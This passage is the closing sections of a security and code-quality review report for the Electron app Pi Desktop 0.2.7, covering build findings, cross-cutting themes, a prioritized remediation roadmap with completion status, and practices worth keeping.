- Claims auto-update via **`electron-updater`** ("downloads in the background", "prompt to restart"). `electron-updater` was deliberately removed (commit `96d64d7`); the real `updater.ts` only does a GitHub-API version check and deep-links to the download page. **Fix:** rewrite the Tech Stack / Releasing sections to describe the actual "check + deep-link" flow.
- The "Quick Install" one-liner hardcodes `Pi-Desktop-0.1.2.dmg` and `/Volumes/Pi Desktop 0.1.2` while the version is `0.2.7`, and the DMG `artifactName` is actually `Pi Desktop-${version}.dmg` (space + different capitalization). The headline install command 404s. **Fix:** make it version-agnostic (query latest release asset via the GitHub API).

### ⚪ Low (build)

- **B-L1** tsconfig hygiene: `strict` is on (good), but `noUnusedLocals`, `noUnusedParameters`, `noImplicitOverride`, and `noUncheckedIndexedAccess` are absent. Without a linter these are the only defense against dead code / unsafe index access. Enable them.
- **B-L2** A stale `index.js` (byte-identical copy of `out/main/index.js`) sits in the repo root — correctly gitignored, but confusing vs `package.json` `main: out/main/index.js`. Delete the local copy.
- **B-L3** GitHub Actions pinned to mutable major tags (`actions/checkout@v4`, `actions/setup-node@v4`) in a `contents: write` publish workflow — pin to commit SHAs and enable `github-actions` Dependabot.

> **Note on a prior premise:** `index.js` and `*.tsbuildinfo` are **not** tracked (verified via `git ls-files`); `.gitignore` correctly excludes them. No findings there.

---

## 7. Cross-cutting themes

These patterns recur across modules and are worth a single coordinated fix:

1. **Silent error swallowing.** Empty `catch {}` / `.catch(() => {})` appear in main (`clone`, `restoreToStock`, `renameSession`, `emitState`, resource loaders) and renderer (push/pull, tab create, prompt). The dominant failure mode is "operation silently no-ops while reporting success / hanging a spinner." Adopt a rule: catches either recover meaningfully, surface via `DIAG_EVENT`/UI, or re-throw — never swallow-and-succeed.
2. **`any` on the highest-risk path.** The agent-event/state/delta pipeline (where R-C1 and the routing bugs live) is almost entirely `any`. Define discriminated-union event types in `src/shared/ipc.ts` and thread them through preload → store. The compiler would catch a whole class of routing/shape bugs.
3. **Resource lifecycle isn't symmetric.** Things are created (runtimes, sessions, listeners, trays, timers) far more carefully than they're destroyed. Establish a teardown counterpart for each `create`/`on`/`setTimeout` and verify `dispose()` chains end-to-end.
4. **Version strings have three+ sources** (`window.pi.versions`, hardcoded `0.79.9`, hardcoded `v0.2.7`) that already disagree. Single-source them from `package.json` / `window.pi.versions`.
5. **No defense in depth at the IPC boundary.** The renderer is trusted today, but combined with the shell-injection findings, one renderer compromise is host RCE. Validate inputs at the boundary and remove the shell from child-process calls.

---

## 8. Prioritized remediation roadmap

### P0 — Before next release (security & data integrity) — ✅ DONE (Round 1)
- ✅ **SEC-1** Remove shell interpolation in `github.ts` → `execFile`/`spawn` with arg arrays.
- ✅ **SEC-2** Drop `shell: true` in `packages.ts` (and SEC-3 installer).
- ✅ **R-C1** Drop per-tab events without a `tabId` instead of defaulting to active tab.
- ✅ **R-H3** Wire `startPiInstall()` into the Install button.

### P1 — Leaks, races, safety net — ✅ DONE (Round 2)
- ✅ **M-H3 / M-H4** Dispose previous runtime/session in `buildRuntime`/`attachSession`.
- ✅ **M-C2 / M-C1** Init-promise guard in `getOrCreate`; idempotent `attachEvents`.
- ✅ **M-H2** Reset/validate `activeTabId` in `removeTab`.
- ✅ **R-M5** Try/catch + `finally` on mutating IPC calls (fix stuck `syncing`).
- ✅ **B-H1 / B-H2** ESLint + Prettier + Vitest; gate CI on typecheck/lint/test.
- ✅ **SEC-5** add `will-navigate` guard. ⬜ **SEC-4** `sandbox: true` (still open — needs a manual run).
- ⬜ **R-M2** Stop refetch-clobbering streaming state on tab-count change *(still open)*.

### P2 — Hardening & polish
- ✅ **M-H1** Real `isCompacting` state. ⬜ **M-M2/M3** swallowed-success paths + cache invalidation.
- ✅ **R-H5/H6** Memoize `MessageItem`/`ToolCallBlock`/`DiffViewer`, throttle scroll.
- ✅ **M-M4/M5** `MessageCache` eviction + TTL + copy-on-store.
- ⬜ **B-M1** Developer ID + notarization; tighten entitlements; fatal verify *(needs Apple Dev ID)*.
- ⬜ **B-M2** Bump `electron-builder`; align `@types`. ✅ added `engines`.
- ⬜ **B-M3** Fix README (auto-update + install command).
- ⬜ **Cross-cutting** Typed events in `src/shared`; ✅ single-source versions (partial); accessibility pass (R-L2/L3).

> Remaining ⬜ items are tracked in [§1.5 "Still open"](#15-remediation-status). None are Critical or High.

---

## 9. What's done well (don't regress)

- **Renderer sandboxing:** `contextIsolation: true`, `nodeIntegration: false`, a real CSP with `script-src 'self'`, `setWindowOpenHandler` denying new windows. Markdown is rendered without raw HTML — no DOM-injection XSS surface.
- **Typed IPC contract** in `src/shared/ipc.ts` mapped 1:1 to preload and handlers — a strong, maintainable boundary.
- **Secret storage** via Electron `safeStorage` (encrypted at rest) rather than plaintext.
- **`fix-path.ts`** is a genuinely thoughtful solution to the macOS GUI-PATH problem (login-shell probe + known-bin fallbacks + nvm/fnm enumeration), and it correctly uses `execFileSync` with an arg array — the safe pattern the rest of the code should adopt.
- **Clean architecture:** per-tab `SessionPool` → `PiSessionManager`, shared-deps caching, message caching — the right shape even where the implementations need the fixes above.
- **CI uses the auto-provisioned `GITHUB_TOKEN`** (no long-lived PATs), and no build artifacts/secrets are committed.

---

*Report generated from a full read of the main-process security surface plus three parallel deep-review passes (Pi subsystem, renderer, build/tooling). All file:line references are against version 0.2.7. No source files were modified during this review.*
